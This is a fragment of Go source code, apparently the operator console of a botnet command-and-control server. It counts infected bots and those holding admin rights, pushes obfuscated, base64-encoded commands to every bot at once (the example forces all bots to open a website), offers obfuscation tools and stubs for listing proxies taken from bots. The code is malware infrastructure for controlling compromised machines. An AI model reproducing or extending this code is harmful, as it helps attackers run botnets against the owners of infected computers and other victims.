				s1 := strconv.Itoa(countAdmin())
				s2 := strconv.Itoa(countFiles())
				fmt.Println("[" + s + "] Total Bots in Database")
				fmt.Println("[" + s1 + "] Total Bots with Admin Rights in Database")
				fmt.Println("[" + s2 + "] Total Files in the Database")
			case "listbots": //List bots, With filters (Country, Admin, Runing server, Ect...)

			case "command": //Add command to DB, Replaces old command.
				//Show old command, Ask for new based on GUID 000 = ALL bots, some type of filter system...
				t1, t2 := commandIssue()
				fmt.Println(" ")
				fmt.Println("This is for Advanced Users! Type 'exit' to leave.")
				fmt.Println("For the normal Visual C&C, activate the panel")
				fmt.Println("Example Command: { 000|0x1|www.google.com|1 } will force all bots to open Google.com")
				fmt.Println("====================")
				fmt.Println("Current Command: " + t1)
				fmt.Println("Current Command Issued: " + t2)
				fmt.Println("====================")
				fmt.Println(" ")
				for {
					fmt.Print("Command: ")
					scan := bufio.NewScanner(os.Stdin)
					scan.Scan()
					switch scan.Text() {
					case "exit":
						goto Start
					case "exit-force":
						os.Exit(0)
					default:
						//Handle Command
						if strings.Contains(scan.Text(), "|") {
							done := setCommand(obfuscate(base64Encode(scan.Text())))
							if done {
								fmt.Println("Command SET!")
							} else {
								fmt.Println("[!] THERE WAS AN ERROR, CHECK DATABASE AND SETTINGS! [!]")
							}
						} else {
							fmt.Println("[!] POSSABLE INVALID COMMAND SYNTAX [!]")
						}
					}
				}
			case "tools": //List C&C Tools
				fmt.Println(" ")
				fmt.Println("Tools")
				fmt.Println("md5 = MD5 HASH of Text.")
				fmt.Println("obfuscate = Obfuscate Text.")
				fmt.Println("deobfuscate = Deobfuscate Text.")
				fmt.Println(" ")
				for {
					fmt.Print("Tool: ")
					scan := bufio.NewScanner(os.Stdin)
					scan.Scan()
					switch scan.Text() {
					case "md5":
						fmt.Print("Text: ")
						scan := bufio.NewScanner(os.Stdin)
						scan.Scan()
						fmt.Println("HASH: " + md5Hash(scan.Text()))
					case "obfuscate":
						fmt.Print("Text: ")
						scan := bufio.NewScanner(os.Stdin)
						scan.Scan()
						fmt.Println("OBFUSCATED: " + obfuscate(scan.Text()))
					case "deobfuscate":
						fmt.Print("Text: ")
						scan := bufio.NewScanner(os.Stdin)
						scan.Scan()
						fmt.Println("DEOBFUSCATED: " + deobfuscate(scan.Text()))
					case "exit":
						goto Start
					case "exit-force":
						os.Exit(0)
					default:
						fmt.Println("[!] Unknown Tool! [!]")
					}
				}
			case "listproxys": //List all the aviviable proxys from bots
			//Show count, have filters by country... maybe ping?
			case "exit": //Kills C&C Server
				os.Exit(0)
			default:
				fmt.Println("[!] Unknown Command! Type 'help' for a list of commands. [!]")
			}
		} */
		backend()
	} else {
		os.Exit(0)
	}
}
